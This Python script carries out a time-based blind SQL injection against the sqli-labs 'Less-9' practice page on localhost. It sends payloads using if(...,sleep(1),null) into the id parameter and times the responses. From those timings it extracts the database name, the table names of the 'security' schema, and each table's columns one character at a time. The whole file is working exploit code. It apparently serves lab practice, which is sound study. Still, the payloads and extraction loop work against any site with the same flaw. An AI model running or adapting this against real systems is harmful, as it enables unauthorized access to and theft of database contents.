#!/usr/bin/python3

import string
import requests

request=requests.Session()
url_len="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(database())={}),sleep(1),null)--+"

def le(url):
    length=0
    for i in range(200):
        r=request.get(url.format(i))
        time=r.elapsed.seconds
        if time==1:
            length+=i
            break
    return length

len_db=le(url_len)
print("length of database is: ",len_db)


def exploit(url,length):
    out=""
    char=string.ascii_letters+'@.,_'
    for i in range(1,length+1):
        for j in char:
            r=request.get(url.format(i,j))
            time=r.elapsed.seconds
            if time==1:
                out +=j
                break
    return out

url_dbname="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select substr(database(),{},1))='{}',sleep(1),null)--+"

db_name=exploit(url_dbname,len_db)
print("database name: ",db_name)
url_tlen="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat(table_name)) from information_schema.tables where table_schema='security')={},sleep(1),null)--+"
len_t=le(url_tlen)

print("table_len",len_t)
url_table="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{},1)='{}',sleep(1),null)--+"

tables=exploit(url_table,29)
print("tables",tables)
tb=tables.split(',')

url_clen="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat(column_name)) from information_schema.columns where table_name='{}')={},sleep(1),null)--+"
url_col="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat(column_name) from information_schema.columns where table_name='{}'),{},1)='{}',sleep(1),null)--+"

for t in tb:
    pl=url_clen.format(t,{})
    l=le(pl)
    p=url_col.format(t,{},{})
    columns=exploit(p,l)
    print("columns in "+t+"are: "+columns)
